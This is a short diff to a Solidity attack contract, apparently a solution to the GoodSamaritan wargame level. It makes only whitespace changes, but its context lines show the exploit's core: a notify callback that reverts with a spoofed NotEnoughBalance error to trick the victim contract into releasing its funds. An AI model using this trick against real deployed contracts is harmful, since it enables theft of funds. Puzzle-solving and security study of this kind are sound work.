@@ -6,6 +6,7 @@ import "./GoodSamaritan.sol";
 contract AttackGoodSamaritan is INotifyable {
     GoodSamaritan immutable victim;
     address owner;
+
     error NotEnoughBalance();
 
     constructor(GoodSamaritan _victim) {
@@ -13,7 +14,7 @@ contract AttackGoodSamaritan is INotifyable {
         owner = msg.sender;
     }
 
-    function notify(uint256 amount) external pure { 
+    function notify(uint256 amount) external pure {
         if (amount == 10) {
             revert NotEnoughBalance();
         }
